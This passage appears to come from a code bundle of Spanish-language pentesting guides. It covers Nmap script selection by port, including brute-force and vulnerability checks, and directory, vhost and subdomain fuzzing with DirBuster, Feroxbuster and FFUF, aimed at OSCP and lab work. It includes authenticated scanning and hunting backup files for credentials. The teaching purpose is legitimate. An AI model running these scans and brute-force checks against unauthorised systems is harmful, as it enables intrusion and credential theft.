| **53**       | DNS (Domain Name System)                | dns-nsid, dns-recursion, dns-zone-transfer, dns-service-discovery, dns-random-srcport                       |
| **80**       | HTTP (Servidor Web No Cifrado)          | http-title, http-enum, http-methods, http-robots.txt, http-shellshock, http-sql-injection, http-php-version |
| **139, 445** | SMB (Server Message Block)              | smb-enum-shares, smb-enum-users, smb-os-discovery, smb-brute, smb-vuln-ms17-010, smb-vuln-ms08-067          |
| **143**      | IMAP (Internet Message Access Protocol) | imap-brute, imap-capabilities, imap-ntlm-info                                                               |
| **443**      | HTTPS (Servidor Web Seguro)             | ssl-enum-ciphers, ssl-cert, ssl-ccs-injection, ssl-heartbleed, ssl-poodle                                   |
| **3306**     | MySQL                                   | mysql-brute, mysql-databases, mysql-empty-password, mysql-users, mysql-vuln-cve2016-6662                    |
| **3389**     | RDP (Remote Desktop Protocol)           | rdp-brute, rdp-enum-encryption, rdp-vuln-ms12-020                                                           |
| **1521**     | Oracle Database                         | oracle-brute, oracle-enum-users, oracle-tns-version, oracle-vuln-cve2012-3137                               |
| **5900**     | VNC (Virtual Network Computing)         | vnc-brute, vnc-info, vnc-title, realvnc-auth-bypass                                                         |

Dichos scripts los podríamos ejecutar mediante la siguiente sintaxis:

\`\`\`ruby
nmap --script=ftp-anon -p 21 <ip_objetivo> # Utilizar script específico.
nmap --script "ftp-*" -p 21 <ip_objetivo> # Utilizar todos los scripts relacionados con el serivicio ftp.
\`\`\`

#### Análisis Detallado de los Resultados del Escaneo

Una vez que hemos realizado el escaneo de la red y obtenido los siguientes resultados:

1. Identificación de los equipos en la red.
2. Análisis de los puertos abiertos en las direcciones IP encontradas.
3. Evaluación de los servicios y versiones en esos puertos.

El siguiente paso es **analizar cada uno de los resultados** que nos arrojan los escaneos para determinar qué acciones tomar.

A continuación, analizamos un ejemplo específico de puerto:

***

####
`,Wr=`## Fuzzing Web con DirBuster: Descubrimiento de Directorios y Archivos Ocultos

Cuando realizamos pruebas de penetración en aplicaciones web, no basta con analizar lo que es visible en la interfaz. Muchos directorios y archivos importantes no aparecen en la estructura pública del sitio, pero siguen siendo accesibles si sabemos cómo buscarlos.

**DirBuster** es una herramienta diseñada específicamente para este propósito: buscar directorios y archivos ocultos en servidores web mediante ataques de fuerza bruta basados en diccionarios. En esta guía, aprenderemos a utilizar **DirBuster** de manera efectiva para descubrir rutas sensibles y posibles puntos de entrada en una auditoría web.

***

### DirBuster - Introducción y Modos de Uso

**DirBuster** es una herramienta basada en Java, creada por **OWASP**, que permite la exploración de directorios y archivos ocultos en servidores web. A diferencia de otras herramientas como **Gobuster** o **FFUF**, **DirBuster** tiene una interfaz gráfica y permite realizar búsquedas tanto con listas predefinidas como con ataques de fuerza bruta generados dinámicamente.

***

### Parámetros Clave en DirBuster

| **Opción**                | **Descripción**                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| \`Target URL\`              | URL del sitio web objetivo.                                        |
| \`Wordlist\`                | Diccionario de nombres de directorios y archivos a buscar.         |
| \`Number of Threads\`       | Número de hilos en paralelo para optimizar el escaneo.             |
| \`File Extension\`          | Extensiones específicas a buscar (Ejemplo: php, txt, html).        |
| \`Go Faster\`               | Acelera la búsqueda con técnicas de optimización.                  |
| \`Follow Redirects\`        | Permite seguir redirecciones HTTP automáticamente.                 |
| \`Stop if too many errors\` | Detiene el escaneo si el servidor responde con demasiados errores. |

***

### Wordlists Recomendadas

 **Directorios y Archivos**

* \`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\`
* \`/usr/share/wordlists/dirb/common.txt\`

 **Archivos Sensibles**

* \`/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\`

***

### Ejemplos de Uso

#### Escaneo de Directorios y Archivos con Interfaz Gráfica

1⃣ Abre **DirBuster** desde la terminal:

\`\`\`bash
java -jar DirBuster.jar
\`\`\`

2⃣ Ingresa la **URL objetivo** en el campo "Target URL".\\
3⃣ Selecciona la **wordlist** (\`directory-list-2.3-medium.txt\`).\\
4⃣ Define el número de **hilos** (recomendado: **50-100** para velocidad óptima).\\
5⃣ Si deseas buscar archivos con extensiones específicas, agrégalas en "File Extension" (Ejemplo: \`php, txt, html\`).\\
6⃣ Haz clic en **Start** para comenzar el escaneo.

***

#### Modo de Línea de Comandos (CLI)

Si prefieres trabajar sin interfaz gráfica, **DirBuster** también permite ejecutar escaneos desde la terminal:

\`\`\`bash
dirbuster -u <url> -l <ruta_diccionario.txt> -t 50 -e php,txt,html -o resultado.txt
\`\`\`

 **Explicación:**\\
 \`-u <url>\`  Define la URL objetivo.\\
 \`-l <diccionario>\`  Indica el diccionario a utilizar.\\
 \`-t 50\`  Usa 50 hilos para mayor velocidad.\\
 \`-e php,txt,html\`  Busca archivos con extensiones específicas.\\
 \`-o resultado.txt\`  Guarda los resultados en un archivo.

***

#### Filtrado de Respuestas Irrelevantes

Para evitar respuestas con códigos de estado no útiles como **403 (Prohibido)** o **404 (No encontrado)**, podemos agregar filtros en la interfaz gráfica o línea de comandos:

\`\`\`bash
dirbuster -u <url> -l <ruta_diccionario.txt> -t 50 -e php,txt,html -o resultado.txt --exclude-status 403,404
\`\`\`

### Explicación:

\\
 \`--exclude-status 403,404\`  Oculta respuestas con códigos **403** y **404**.

***
`,Gr=`Guía práctica de **Feroxbuster** para enumeración de contenido web, orientada a OSCP, CTFs y pentesting autorizado. La idea central: no "lanzar y mirar qué sale", sino **identificar la tecnología → elegir wordlist y extensiones → escanear → analizar respuestas → eliminar falsos positivos → profundizar → correlacionar hallazgos**.

> Flags verificadas contra la documentación actual del proyecto \`epi052/feroxbuster\`. Donde una opción cambió respecto a guías antiguas, se indica la forma vigente.

***

## ¿Qué es Feroxbuster?

Feroxbuster es una herramienta de **forced browsing**: usa una wordlist para generar rutas y hacer peticiones HTTP, descubriendo recursos que **existen pero no están enlazados** desde la aplicación.

\`\`\`text
http://<ip>/
        ├── /admin
        ├── /backup
        ├── /uploads
        ├── /config
        ├── /api
        └── /old
\`\`\`

Cubre *directory enumeration*, *file enumeration* y *resource enumeration*. Su fuerte frente a otras herramientas: **recursividad**, **filtrado de respuestas** e integración con Burp.

***

## ¿Cuándo utilizarlo?

Normalmente tras detectar un servicio web en la fase de escaneo:

\`\`\`text
80/tcp    HTTP
443/tcp   HTTPS
8080/tcp  HTTP
8000/tcp  HTTP
8443/tcp  HTTPS
\`\`\`

Flujo típico:

\`\`\`text
Nmap → HTTP/HTTPS encontrado → Identificar aplicación (WhatWeb / curl / navegador / Burp)
     → Feroxbuster → Directorios / archivos → Enumeración específica
\`\`\`

***

## Instalación

En Kali Linux:

\`\`\`bash
sudo apt install feroxbuster
\`\`\`

Comprobar instalación y versión:

\`\`\`bash
feroxbuster --help
feroxbuster --version
\`\`\`

> El repositorio oficial es \`epi052/feroxbuster\`. Para la última versión y binarios, consulta la página de *releases* oficial en lugar de fijar un número de versión (cambia con el tiempo).

***

## Primer escaneo

La forma más sencilla (usa la wordlist/config por defecto):

\`\`\`bash
feroxbuster -u http://<ip>
\`\`\`

***

## Entender el resultado

Cada línea tiene esta forma:

\`\`\`text
200   GET   91l   320w   1859c   http://<ip>/admin
301   GET   91l   320w    309c   http://<ip>/docs
403   GET   91l   320w    285c   http://<ip>/config
\`\`\`

Los campos clave son: **status code → URL → size (c) / words (w) / lines (l)**.

> No mires solo el \`200\`. Un \`403 /admin\` es muy interesante: demuestra que el recurso **existe** aunque tu acceso esté restringido.

### Status codes importantes

| Código | Significado práctico |
|---|---|
| \`200\` | Recurso accesible |
| \`204\` | Respuesta sin contenido |
| \`301\` | Redirección permanente |
| \`302\` | Redirección temporal |
| \`307\` | Redirección temporal (preserva método) |
| \`308\` | Redirección permanente (preserva método) |
| \`401\` | Requiere autenticación |
| \`403\` | Recurso existente, acceso prohibido |
| \`404\` | Recurso no encontrado |
| \`405\` | Método HTTP no permitido |

Por defecto, Feroxbuster considera de interés: \`200, 204, 301, 302, 307, 308, 401, 403, 405\`.

***

## Wordlists

Elegir bien la wordlist es una de las decisiones más importantes.

\`\`\`bash
feroxbuster -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
\`\`\`

Estrategia (de menor a mayor, no siempre la más grande):

\`\`\`text
Primera pasada      → common.txt
Más profunda        → raft-medium-directories.txt
Exhaustiva          → raft-large-directories.txt

Wordlist pequeña → ¿encuentro algo?
   ├── NO  → wordlist mayor
   └── YES → enumerar lo encontrado
\`\`\`

***

## Extensiones

Si el servidor usa una tecnología concreta, añade sus extensiones con \`-x\`:

\`\`\`bash
feroxbuster -u http://<ip> -x php
feroxbuster -u http://<ip> -x php,txt,html
feroxbuster -u http://<ip> -x php,txt --silent
\`\`\`

Extensiones útiles según la tecnología:

| Tecnología | Extensiones |
|---|---|
| PHP | \`php\` |
| ASP.NET | \`aspx\`, \`ashx\`, \`config\` |
| Java | \`jsp\` |
| HTML / JS | \`html\`, \`htm\`, \`js\` |
| Configuración | \`conf\`, \`config\`, \`ini\` |
| Datos | \`json\`, \`xml\` |
| Backups | \`bak\`, \`old\`, \`backup\` |
| Documentos | \`txt\`, \`pdf\`, \`docx\` |

> **Regla: tecnología → extensiones.** No lances siempre \`-x php,asp,aspx,jsp,...\`. Identifica primero la pila (WhatWeb/curl): Apache+PHP → \`-x php,txt,bak\`; IIS/ASP.NET → \`-x aspx,config\`. La enumeración se basa en información previa, no en la wordlist más grande.

\`\`\`bash
feroxbuster -u http://<ip> \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -x php,txt,bak,old,conf
\`\`\`

***

## Redirecciones

Feroxbuster puede seguir redirecciones con \`-r\` / \`--redirects\`:

\`\`\`bash
feroxbuster -u http://<ip> -r
\`\`\`

\`\`\`text
http://<ip>/ → 301 → /app/ → continuar el scan sobre /app/
\`\`\`

Úsalo especialmente cuando la raíz redirige a la aplicación real (\`/\` → \`301\` → \`/app/\`): sin \`-r\` puedes perder el contexto de la app redirigida.

***

## Recursividad y profundidad

La enumeración recursiva es una de sus mejores características: al encontrar \`/admin/\`, continúa sobre \`/admin/*\`.

\`\`\`text
/
├── admin/  → users/ · config/
├── docs/   → api/ · old/
└── uploads/
\`\`\`

Controlarla:

\`\`\`bash
feroxbuster -u http://<ip> -n          # Sin recursión (solo primer nivel)
feroxbuster -u http://<ip> -d 2        # Limitar profundidad de recursión
feroxbuster -u http://<ip> --force-recursion   # Forzar intentos de recursión
feroxbuster -u http://<ip> -f          # Añadir "/" a cada URL (--add-slash)
\`\`\`

| Flag | Función |
|---|---|
| \`-n\` / \`--no-recursion\` | Desactiva la recursión |
| \`-d\` / \`--depth\` | Profundidad máxima de recursión |
| \`-L\` / \`--scan-limit\` | Nº de escaneos concurrentes (no es la profundidad) |
| \`--force-recursion\` | Fuerza recursión sobre endpoints encontrados |
| \`-f\` / \`--add-slash\` | Añade \`/\` a cada URL solicitada |

> **Corrección frente a guías antiguas:** la profundidad de recursión es \`-d\`/\`--depth\`. El flag \`-L\`/\`--scan-limit\` controla el número de escaneos **concurrentes**, no la profundidad.

***

## Filtrado de resultados

Decide qué respuestas quieres ver. Dos enfoques:

\`\`\`bash
feroxbuster -u http://<ip> -C 404              # Filtrar (excluir) estos status
feroxbuster -u http://<ip> -s 200,301,302      # Mostrar SOLO estos status
feroxbuster -u http://<ip> -S 285              # Filtrar por tamaño (bytes)
feroxbuster -u http://<ip> -W 33               # Filtrar por nº de palabras
feroxbuster -u http://<ip> -N 9                # Filtrar por nº de líneas
\`\`\`

| Flag | Función |
|---|---|
| \`-C\` / \`--filter-status\` | Excluir estos códigos |
| \`-s\` / \`--status-codes\` | Códigos de interés (incluir solo estos) |
| \`-S\` / \`--filter-size\` | Excluir por tamaño |
| \`-W\` / \`--filter-words\` | Excluir por nº de palabras |
| \`-N\` / \`--filter-lines\` | Excluir por nº de líneas |

### Cuándo filtrar: Soft 404

Si todo devuelve \`200\`, puede existir un **Soft 404** (el servidor responde "válido" para rutas inexistentes):

\`\`\`text
/recurso-real      → 200
/recurso-inventado → 200   ← falso positivo
\`\`\`

No asumas que todo \`200\` es válido. Compara **status · tamaño · palabras · líneas · contenido** entre una ruta real y una inventada, y filtra el patrón repetido:

\`\`\`text
Muchos resultados → ¿mismo tamaño? → -S (size)
                 → ¿siguen falsos? → -W (words)
                 → ¿siguen falsos? → -N (lines)
\`\`\`

***

## Wildcard / Soft 404 automático

Feroxbuster filtra automáticamente respuestas *wildcard* (\`auto-filter wildcards = true\`). Para desactivarlo:

\`\`\`bash
feroxbuster -u http://<ip> -D     # --dont-filter
\`\`\`

Diagnóstico manual antes de lanzar una wordlist grande:

\`\`\`bash
curl -i http://<ip>/doesnotexist
curl -i http://<ip>/admin
\`\`\`

Si ambas devuelven lo mismo (mismo status, \`Content-Length\`, body…), estás ante respuestas wildcard y debes configurar el filtrado.

***

## Rendimiento: threads, rate limit y timeout

\`\`\`bash
feroxbuster -u http://<ip> -t 20            # Hilos (por defecto 50)
feroxbuster -u http://<ip> --rate-limit 100 # Peticiones por segundo
feroxbuster -u http://<ip> -T 5             # Timeout por petición (por defecto 7s)
\`\`\`

¿Por qué reducir hilos o limitar el ritmo? Para evitar **rate limiting, WAF, servidores lentos/inestables, errores de conexión o pérdida de resultados**.

\`\`\`text
Conservador → -t 10
Lab rápido  → -t 50
\`\`\`

***

## Salida y modos

\`\`\`bash
feroxbuster -u http://<ip> -q              # Quiet: oculta banner y progreso
feroxbuster -u http://<ip> --silent        # Salida mínima (ideal para pipelines)
feroxbuster -u http://<ip> -o results.txt  # Guardar resultados
\`\`\`

Diferencia: \`-q\` oculta banner/progreso; \`--silent\` produce solo URLs/resultados mínimos para procesamiento. Guardar la salida es clave en OSCP para organizar la enumeración:

\`\`\`text
enumeration/
├── nmap/
├── feroxbuster/
│   ├── root.txt
│   ├── admin.txt
│   └── api.txt
└── notes.md
\`\`\`

***

## Autenticación: cookies y headers

Enumerar **con una sesión válida** descubre endpoints visibles solo para usuarios autenticados.

\`\`\`bash
feroxbuster -u http://<ip> -b "PHPSESSID=abc123"          # Cookie (--cookies)
feroxbuster -u http://<ip> -H "Authorization: Bearer TOKEN"   # Header (--headers)
\`\`\`

\`\`\`text
Login → Cookie/Session → Feroxbuster autenticado → /admin /dashboard /settings /api /internal
\`\`\`

Ejemplo autenticado con extensiones y profundidad:

\`\`\`bash
feroxbuster -u http://<ip> \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -x php,bak,txt \\
  -b "PHPSESSID=abc123" \\
  -d 2
\`\`\`

***

## User-Agent

\`\`\`bash
feroxbuster -u http://<ip> -a "Mozilla/5.0"   # UA personalizado
feroxbuster -u http://<ip> -A                 # UA aleatorio (--random-agent)
\`\`\`

> Cambiar el User-Agent **no** equivale a evadir un WAF de forma fiable: es solo una modificación de la cabecera HTTP.

***

## Métodos HTTP

Por defecto usa \`GET\`. Puedes especificar otros con \`-m\` / \`--methods\`:

\`\`\`bash
feroxbuster -u http://<ip> -m POST
feroxbuster -u http://<ip> -m GET,POST
\`\`\`

> **Cuidado:** no uses métodos distintos de \`GET\` sin entender la aplicación. Una enumeración \`POST\` puede provocar **efectos secundarios** en ciertos endpoints.

***

## HTTPS con certificados inválidos

Habitual en laboratorios (certificados autofirmados):

\`\`\`bash
feroxbuster -u https://<ip> -k    # --insecure
\`\`\`

> \`-k\` no se usa porque HTTPS sea "inseguro", sino cuando la validación del certificado impide la conexión (p. ej. autofirmados en labs).

***

## Proxy y Burp Suite

Enviar las peticiones a través de Burp para estudiarlas:

\`\`\`bash
feroxbuster -u http://<ip> --burp                     # Atajo para Burp
feroxbuster -u http://<ip> --proxy http://127.0.0.1:8080
\`\`\`

\`\`\`text
Feroxbuster → 127.0.0.1:8080 → Burp Suite → Target
\`\`\`

Permite observar y analizar headers, cookies, redirects, status, requests/responses y el flujo de autenticación de cada petición generada.

***

## Objetivos por STDIN y pipelines

\`\`\`bash
cat targets.txt | feroxbuster --stdin
cat targets.txt | feroxbuster --stdin --silent    # Encadenar con otras herramientas
\`\`\`

\`--stdin\` lee URLs de la entrada estándar; combinado con \`--silent\` encaja en pipelines.

***

## Reanudar un escaneo

Feroxbuster guarda el estado; si cancelas (\`Ctrl+C\`) puedes continuar:

\`\`\`bash
feroxbuster --resume-from ferox-http_<ip>-<timestamp>.state -q
\`\`\`

\`\`\`text
Escaneo largo → Ctrl+C → estado guardado → --resume-from → continuar
\`\`\`

***

## Descubrimiento adicional

Más allá de la wordlist, Feroxbuster puede ampliar la enumeración por sí mismo:

\`\`\`bash
feroxbuster -u http://<ip> -e            # --extract-links: enlaces de HTML/JS
feroxbuster -u http://<ip> --collect-backups   # Prueba extensiones de backup (~ .bak .bak2 .old .1)
feroxbuster -u http://<ip> -E            # --collect-extensions: añade extensiones observadas
\`\`\`

* \`-e\` / \`--extract-links\`: combina enumeración por wordlist **+** descubrimiento de enlaces.
* \`--collect-backups\`: busca copias como \`config.php.bak\`, \`config.php.old\`… que pueden contener **código fuente, credenciales, configuración, API keys o connection strings**.
* \`-E\` / \`--collect-extensions\`: observa extensiones en los resultados y las reaprovecha.

***

## Qué hacer ante cada hallazgo

No pases de largo. Cada tipo de resultado abre una línea de trabajo.

### Un directorio

\`\`\`text
/admin → ¿Status? ¿Autenticación? ¿Tecnología? ¿Archivos?
       ¿Subdirectorios? ¿Backups? ¿Funcionalidad interesante?
\`\`\`

Después, vuelve a enumerar sobre él: \`feroxbuster -u http://<ip>/admin ...\`

### Un archivo

Ejemplo \`config.php.bak\`: no sigas enumerando sin mirarlo.

\`\`\`bash
curl http://<ip>/config.php.bak
wget http://<ip>/config.php.bak
cat config.php.bak    # buscar: username password DB_* API_KEY SECRET TOKEN
\`\`\`

### \`/backup\`

Prioriza por valor: **SQL → ZIP → BAK → OLD → CONFIG**. Pueden revelar código fuente, credenciales, estructura interna, usuarios, bases de datos y secretos.

### \`403\`

No significa "no sirve", sino **existe pero acceso prohibido**. Investiga variantes y controles:

\`\`\`text
/admin · /admin/ · /admin/index.php · /admin/login
Autenticación · cookies · headers · Host · redirecciones · métodos HTTP
\`\`\`

### \`401\`

Indica un mecanismo de autenticación. Revisa \`WWW-Authenticate\` y la app. Si ya tienes sesión:

\`\`\`bash
feroxbuster -u http://<ip>/admin -b "SESSION=..."
\`\`\`

### \`301\` / \`302\`

Sigue la redirección manualmente (\`curl -I http://<ip>/admin\`) o deja que Feroxbuster la siga con \`-r\`.

***

## Comprobaciones manuales que no debes saltarte

Feroxbuster no sustituye la revisión manual:

\`\`\`bash
curl http://<ip>/robots.txt
curl http://<ip>/sitemap.xml
\`\`\`

Incorpora las rutas descubiertas ahí al proceso de enumeración.

***

## Flujo de trabajo (OSCP)

\`\`\`text
80 / 443 / HTTP
   ↓
curl / WhatWeb → identificar tecnología
   ↓
robots.txt · sitemap.xml
   ↓
Feroxbuster inicial (wordlist + extensiones)
   ↓
¿Resultados?
   ├── NO  → cambiar wordlist
   └── YES → analizar resultados → ¿Soft 404? → filtrar size/words/lines
                ↓
         Segundo scan sobre directorios encontrados
                ↓
         /admin · /api · /backup · /uploads · /config
                ↓
         ¿Autenticación? → cookie/header → scan autenticado
                ↓
         Archivos interesantes → credenciales / código / secretos
                ↓
         Siguiente fase del pentest
\`\`\`

***

## Árbol de decisión

\`\`\`text
¿HTTP/HTTPS?
   └─ Sí → identificar tecnología → elegir wordlist → scan inicial
             │
             ├─ ¿Resultados? ── NO → cambiar wordlist
             │                 └ YES → analizar status
             │                           └ ¿Soft 404? ── Sí → filtrar size/words/lines
             │                                          └ No → continuar
             ├─ ¿Directorio?  → enumerar recursivamente
             ├─ ¿Extensión conocida? → -x php,txt,bak...
             └─ ¿Autenticación? → cookie/header → enumeración autenticada
\`\`\`

***

## "Encontré X → ¿qué hago?"

| Hallazgo | Siguiente paso |
|---|---|
| \`/admin\` | Enumerar \`/admin\` |
| \`/api\` | Enumerar endpoints/API |
| \`/backup\` | Buscar backups y archivos sensibles |
| \`/uploads\` | Enumerar contenido y funcionalidad |
| \`/config\` | Comprobar archivos de configuración |
| \`/robots.txt\` | Leer manualmente |
| \`/sitemap.xml\` | Enumerar URLs descubiertas |
| \`403\` | Confirmar existencia y estudiar controles |
| \`401\` | Analizar autenticación |
| \`301\` / \`302\` | Revisar destino |
| \`.bak\` / \`.old\` | Descargar y analizar |
| \`.sql\` | Analizar contenido |
| \`.zip\` | Descargar y extraer |
| \`.php\` | Revisar funcionalidad/código si es accesible |
| Muchos \`200\` | Comprobar Soft 404 |
| Mismo tamaño / words / lines | Filtrar por \`-S\` / \`-W\` / \`-N\` |
| Cookie disponible | Enumeración autenticada |
| Tecnología identificada | Adaptar extensiones/wordlist |

***

## Referencia rápida de comandos

| Objetivo | Comando |
|---|---|
| Scan básico | \`feroxbuster -u http://<ip>\` |
| Wordlist | \`feroxbuster -u http://<ip> -w <wordlist>\` |
| Extensiones | \`feroxbuster -u http://<ip> -x php,txt,bak\` |
| Recursividad (profundidad) | \`feroxbuster -u http://<ip> -d 2\` |
| Sin recursividad | \`feroxbuster -u http://<ip> -n\` |
| Seguir redirecciones | \`feroxbuster -u http://<ip> -r\` |
| Filtrar status | \`feroxbuster -u http://<ip> -C 404\` |
| Solo ciertos status | \`feroxbuster -u http://<ip> -s 200,301,302,403\` |
| Filtrar tamaño | \`feroxbuster -u http://<ip> -S 1234\` |
| Filtrar palabras | \`feroxbuster -u http://<ip> -W 100\` |
| Filtrar líneas | \`feroxbuster -u http://<ip> -N 20\` |
| Hilos | \`feroxbuster -u http://<ip> -t 20\` |
| Timeout | \`feroxbuster -u http://<ip> -T 5\` |
| Output | \`feroxbuster -u http://<ip> -o results.txt\` |
| User-Agent | \`feroxbuster -u http://<ip> -a "Mozilla/5.0"\` |
| UA aleatorio | \`feroxbuster -u http://<ip> -A\` |
| Header | \`feroxbuster -u http://<ip> -H "Authorization: Bearer TOKEN"\` |
| Cookie | \`feroxbuster -u http://<ip> -b "PHPSESSID=VALUE"\` |
| Proxy / Burp | \`feroxbuster -u http://<ip> --proxy http://127.0.0.1:8080\` |
| HTTPS cert. inválido | \`feroxbuster -u https://<ip> -k\` |
| STDIN | \`cat targets.txt \\| feroxbuster --stdin\` |
| Reanudar | \`feroxbuster --resume-from <state_file>\` |

### Para memorizar (OSCP)

\`\`\`bash
# 1. Scan básico
feroxbuster -u http://<ip>

# 2. Wordlist + extensiones
feroxbuster -u http://<ip> \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -x php,txt,bak

# 3. Recursivo controlado
feroxbuster -u http://<ip> -w <wordlist> -x php,txt,bak -d 2

# 4. Filtrar falsos positivos
feroxbuster -u http://<ip> -C 404 -S <size>

# 5. Autenticado
feroxbuster -u http://<ip> -b "SESSION=VALUE"

# 6. A través de Burp
feroxbuster -u http://<ip> --proxy http://127.0.0.1:8080
\`\`\`

***

## Feroxbuster vs Gobuster vs ffuf

| Herramienta | Punto fuerte |
|---|---|
| **Feroxbuster** | Recursividad + filtrado + enumeración de contenido |
| **Gobuster** | Simplicidad y rapidez |
| **ffuf** | Fuzzing muy flexible |
| **DirBuster** | Interfaz gráfica / enfoque clásico |

***

## Checklist

### Preparación
- [ ] Puerto HTTP/HTTPS identificado
- [ ] URL correcta
- [ ] Tecnología identificada (WhatWeb/curl)
- [ ] robots.txt
- [ ] sitemap.xml
- [ ] Wordlist seleccionada
- [ ] Extensiones seleccionadas

### Scan inicial
- [ ] Scan básico
- [ ] Revisar status codes
- [ ] Directorios
- [ ] Archivos
- [ ] Redirecciones
- [ ] 403 / 401 / 301 / 302

### Falsos positivos
- [ ] Comprobar Soft 404
- [ ] Comparar tamaño / words / lines
- [ ] Filtrar status / size / words / lines

### Profundización
- [ ] Recursividad y profundidad
- [ ] Extensiones
- [ ] Backup files
- [ ] Subdirectorios
- [ ] APIs / paneles admin / configuración / uploads

### Autenticación
- [ ] Cookies
- [ ] Authorization header
- [ ] Headers personalizados
- [ ] Enumeración autenticada

### Infraestructura
- [ ] Burp / Proxy
- [ ] HTTPS / certificados
- [ ] Rate limiting / threads / timeout

### Resultados
- [ ] Guardar output
- [ ] Documentar endpoints
- [ ] Descargar archivos interesantes
- [ ] Analizar backups
- [ ] Buscar credenciales
- [ ] Correlacionar con otras vulnerabilidades

***

## La idea que debes recordar

Feroxbuster no solo encuentra carpetas: **convierte una aplicación web desconocida en un mapa de recursos**.

\`\`\`text
WEB SERVER → Feroxbuster
   ├── Directorios  → /admin · /backup · /uploads
   ├── Archivos     → .bak · .sql · .conf
   └── Endpoints    → /api · /login · /internal
                 ↓
         Información útil
   ├── Credenciales
   ├── Código
   └── Funcionalidad
                 ↓
         Siguiente fase del pentest
\`\`\`

> **Regla mental:** HTTP encontrado → identificar tecnología → elegir wordlist y extensiones → scan inicial → analizar respuestas → eliminar falsos positivos → enumerar directorios interesantes → recursivo → autenticar si es posible → buscar archivos sensibles → correlacionar hallazgos.

***

**Fuentes:** guía *A Detailed Guide on Feroxbuster* (base práctica) y documentación/repositorio oficial \`epi052/feroxbuster\` (verificación de opciones actuales: \`--depth\`, \`--scan-limit\`, \`--extract-links\`, \`--collect-backups\`, \`--collect-extensions\`, \`--rate-limit\`, \`--stdin\`, \`--resume-from\`).
`,Kr=`## Fuzzing Web con FFUF: Descubrimiento de Directorios y Subdominios

Cuando realizamos auditorías en aplicaciones web, no siempre es suficiente analizar lo visible. Existen rutas, directorios y subdominios ocultos que pueden contener información sensible o puntos de entrada vulnerables.

Para descubrir estos elementos ocultos, utilizamos **fuzzing**, una técnica que emplea diccionarios para probar múltiples combinaciones y detectar recursos expuestos. En esta guía, aprenderemos a utilizar **FFUF (Fuzz Faster U Fool)**, una de las herramientas más rápidas y eficientes para esta tarea.

***

### FFUF - Introducción y Modos de Uso

**FFUF** es una herramienta de fuzzing de código abierto, desarrollada para realizar búsquedas de directorios, archivos y subdominios en servidores web de manera rápida y eficiente.

#### Modos Principales de FFUF

| **Modo**  | **Descripción**                                        |
| --------- | ------------------------------------------------------ |
| **DIR**   | Enumeración de directorios y archivos web.             |
| **DNS**   | Descubrimiento de subdominios mediante fuzzing de DNS. |
| **VHOST** | Enumeración de hosts virtuales en servidores web.      |

***

### Parámetros Clave en FFUF

| **Flag**      | **Descripción**                                            |
| ------------- | ---------------------------------------------------------- |
| \`-u\`          | URL objetivo donde se realizará el fuzzing.                |
| \`-w\`          | Ruta del diccionario a utilizar.                           |
| \`-t\`          | Número de hilos en paralelo para agilizar el escaneo.      |
| \`-e\`          | Extensiones a buscar (Ejemplo: php, txt, html).            |
| \`-fc\`         | Filtrar por códigos de estado (Ejemplo: 403, 404, 301).    |
| \`-fs\`         | Excluir respuestas según su tamaño en bytes.               |
| \`-mc\`         | Mostrar solo respuestas con códigos de estado específicos. |
| \`-o\`          | Exportar resultados a un archivo (json, csv, txt).         |
| \`--recursion\` | Activar escaneo recursivo en directorios descubiertos.     |

***

### Wordlists Recomendadas

 **Directorios y Archivos**

* \`/usr/share/wordlists/dirb/common.txt\`
* \`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\`

 **Subdominios**

* \`/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\`

***

### Ejemplos de Uso

#### Modo \`dir\` (Enumeración de Directorios y Archivos)

\`\`\`bash
ffuf -u <url>/FUZZ -w <ruta_diccionario.txt> -t 50 -fc 404,403,301
\`\`\`

 **Explicación:**\\
 \`-u http://<url>/FUZZ\`  Reemplaza \`FUZZ\` con cada palabra del diccionario.\\
 \`-w /usr/share/wordlists/...\`  Diccionario utilizado.\\
 \`-t 50\`  Ejecuta el escaneo con 50 hilos en paralelo.\\
 \`-fc 404,403,301\`  Excluye respuestas con esos códigos de estado.

***

#### Modo \`dns\` (Búsqueda de Subdominios)

\`\`\`bash
ffuf -u <url> -w <ruta_diccionario.txt> -t 50 -mc 200
\`\`\`

 **Explicación:**\\
 \`FUZZ.example.com\`  Se reemplaza \`FUZZ\` con palabras del diccionario para buscar subdominios.\\
 \`-mc 200\`  Muestra solo respuestas con código **200** (OK).

***

#### Modo \`vhost\` (Descubrimiento de Virtual Hosts)

\`\`\`bash
ffuf -u <url> -H "Host: FUZZ.<url>" -w <ruta_diccionario.txt> -t 50 -mc 200
\`\`\`

 **Explicación:**\\
 \`-H "Host: FUZZ.example.com"\`  Modifica el encabezado **Host** para probar diferentes nombres de host.\\
 \`-mc 200\`  Muestra solo respuestas con código **200** (OK).

***

### Filtrado Avanzado de Resultados

Para mejorar la precisión del escaneo, podemos aplicar filtros avanzados:

#### Ocultar respuestas con códigos de estado específicos

\`\`\`bash
ffuf -u <url>/FUZZ -w <ruta_diccionario.txt> -fc 404,403,301
\`\`\`

#### Excluir respuestas por tamaño

\`\`\`bash
ffuf -u <url>/FUZZ -w <ruta_diccionario.txt> -fs 1234
\`\`\`

 **Explicación:**\\
 \`-fs 1234\`  Excluye respuestas de **1234 bytes** de tamaño.

***

### Consejos para un Escaneo Eficiente

 **Utiliza wordlists específicas** para cada tipo de prueba.\\
 **Ajusta los hilos (\`-t\`)** según el rendimiento del servidor.\\
 **Filtra resultados irrelevantes** (\`-fc\`, \`-fs\`, \`-mc\`).\\
 **Prueba con diferentes herramientas**, como \`gobuster\` o \`dirbuster\`, para comparar resultados.
`,qr=`## Fuzzing Web: Descubriendo Rutas y Subdominios Ocultos

Cuando realizamos una auditoría en los puertos **80/443**, no solo debemos centrarnos en lo que es visible a simple vista. Existen rutas y directorios ocultos, como \`/wp-login\`, \`/uploads\`, \`/robots.txt\`, o \`/sitemap.xml\`, pero también hay muchos más que no aparecerán directamente en el código fuente.

